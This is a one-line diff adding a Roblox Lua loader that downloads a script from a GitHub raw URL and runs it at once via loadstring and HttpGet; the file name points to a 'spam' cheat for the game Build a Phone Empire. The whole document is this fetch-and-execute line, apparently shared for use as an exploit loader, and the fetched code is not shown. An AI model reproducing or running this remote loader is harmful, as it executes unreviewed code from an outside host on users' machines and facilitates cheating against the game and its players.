@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/build-a-phone-empire-spam1-3y9il352jpr3ob.lua"))()
